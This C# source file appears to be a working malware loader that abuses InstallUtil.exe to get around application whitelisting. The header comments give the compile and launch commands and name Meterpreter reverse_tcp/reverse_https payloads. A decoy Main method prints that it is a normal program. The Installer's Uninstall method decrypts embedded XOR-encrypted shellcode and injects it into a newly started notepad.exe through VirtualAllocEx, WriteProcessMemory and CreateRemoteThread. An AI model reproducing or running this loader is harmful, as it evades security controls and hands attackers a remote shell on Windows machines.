
//C:\Users\dhanush\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U c:\users\dhanush\Desktop\program3.exe
//C:\Users\dhanush\Desktop>c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe c:\users\dhanush\Desktop\program3.cs
//only windows/meterpreter/reverse_tcp or windows/meterpreter/reverse_https ,anything which is not x64
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

public class Program
{
    public static void Main()
    {
        // Generic code execution
        Console.WriteLine("I am a normal program!");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Malicious process hollowing code
        string targetProcess = "notepad.exe"; // Target process
        byte[] encryptedShellcode = new byte[] {0x19, 0xc4, 0x95, 0x1, 0x55, 0xfe, 0x89, 0x7d, 0x7a, 0xd, 0x4d, 0xfa, 0x75, 0xc4, 0xf8, 0x28, 0xb7, 0x20, 0x91, 0x53, 0x41, 0xf1, 0x5e, 0x6, 0x8e, 0xf, 0xda, 0xb6, 0xcf, 0x69, 0xf9, 0x63, 0x49, 0x10, 0x7b, 0x7d, 0x57, 0xd2, 0xc9, 0x8d, 0x67, 0x89, 0xa9, 0x59, 0xb7, 0xe3, 0x27, 0xf1, 0x6e, 0x7e, 0xa, 0x56, 0xde, 0xbc, 0xd5, 0x4d, 0x78, 0xf, 0xe8, 0xe6, 0x7b, 0x56, 0xbc, 0xef, 0xe4, 0xfc, 0x4a, 0x8a, 0x1d, 0xe6, 0x62, 0x14, 0x88, 0x85, 0x7b, 0x1b, 0x37, 0xe2, 0xf4, 0x92, 0x1a, 0x65, 0x91, 0x35, 0xde, 0xff, 0x3f, 0x7d, 0x68, 0x45, 0x67, 0x93, 0x52, 0x97, 0xf, 0x9b, 0x5, 0x59, 0xee, 0x2, 0x28, 0x6, 0xd2, 0x31, 0x8c, 0xf1, 0x48, 0xc6, 0x75, 0xce, 0xec, 0xa2, 0x36, 0x4a, 0x91, 0xd, 0x1e, 0x75, 0xb1, 0x50, 0xa9, 0x57, 0x23, 0x9a, 0x75, 0x97, 0x18, 0x2a, 0xa1, 0x8, 0x3e, 0x5a, 0xe, 0x9f, 0xb0, 0x16, 0xf9, 0x7b, 0x48, 0xc6, 0xa1, 0xcc, 0x43, 0xb1, 0xc, 0xac, 0xe5, 0xfe, 0xaa, 0xa3, 0x81, 0x7f, 0x9a, 0x84, 0xa8, 0xf6, 0x89, 0xe5, 0xfa, 0xfc, 0xb1, 0x44, 0x56, 0x76, 0x73, 0xf9, 0x60, 0xa4, 0x57, 0x54, 0x10, 0xe, 0xff, 0x96, 0xc8, 0x8a, 0x21, 0x78, 0x4a, 0x69, 0x7c, 0x7e, 0x82, 0x4c, 0x57, 0x51, 0xc2, 0x94, 0x96, 0x56, 0x60, 0x21, 0x6d, 0x44, 0x18, 0x1, 0x54, 0x42, 0x60, 0xaa, 0xf8, 0xd4, 0xf8, 0xce, 0xbe, 0xc6, 0x88, 0xf3, 0x8d, 0xc6, 0x15, 0xde, 0xb5, 0x1, 0x3c, 0xdb, 0xc2, 0x94, 0xfe, 0xc9, 0x96, 0xf, 0x6d, 0xd7, 0x84, 0xd3, 0xcf, 0x84, 0x95, 0x8a, 0xe3, 0xb3, 0xe6, 0x8c, 0xdd, 0x72, 0x16, 0xf1, 0xc8, 0xa3, 0xe5, 0x46, 0x1a, 0x6b, 0x51, 0xa8, 0xbe, 0x24, 0xaa, 0x5d, 0x60, 0xc1, 0x1, 0x43, 0x4b, 0x5b, 0xe5, 0x52, 0x2c, 0x8a, 0x63, 0x94, 0xa9, 0x24, 0xa8, 0x94, 0xa8, 0x9e, 0xa8, 0xfc, 0xc8, 0xcb, 0xbd, 0x88, 0x49, 0xe4, 0xaa, 0x2b, 0x7a, 0x1f, 0xc2, 0x84, 0xfe, 0xcd, 0xa9, 0xfe, 0xca, 0x7a, 0x2d, 0x73, 0xe5, 0xd4, 0xd6, 0x6, 0xe9, 0x31, 0x80, 0xdc, 0xc0, 0x9e, 0xbe, 0x96, 0xc8, 0xc9, 0xe5, 0x7c, 0x72, 0xa, 0x7a, 0xf1, 0xd9, 0xb3, 0x7d, 0xd3, 0xc0, 0xeb, 0x90, 0xdb, 0xa9, 0x5c, 0x30, 0x72, 0x44, 0xfe, 0x59, 0xda, 0xe6, 0xc9, 0xd8, 0x7b, 0x57, 0x61, 0x17, 0xd, 0x37, 0x5c, 0x1a, 0x2d, 0xd9, 0x28, 0x93, 0x8b, 0x28, 0x8f, 0x13, 0x74, 0x1d, 0x3c, 0xa8, 0xfc, 0xc8, 0xf0, 0x1a, 0xf9   }; // Example encrypted shellcode
        byte[] key = new byte[] { 0xe5, 0x2c, 0x1a, 0x1, 0x55, 0xfe, 0xe9, 0x4c, 0xa8, 0x84, 0xa8, 0x9e, 0xfe, 0x96, 0xc8, 0xa3  }; // XOR decryption key

        // Decrypt the shellcode using XOR
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);
        }

        Process process = Process.Start(targetProcess);

        
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, process.Id);
            
        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, 0x3000, 0x40);
                
               
        IntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocatedMemory, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten);

        IntPtr threadHandle;
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadHandle);
        
        CloseHandle(hProcess);
            
        
    }
}
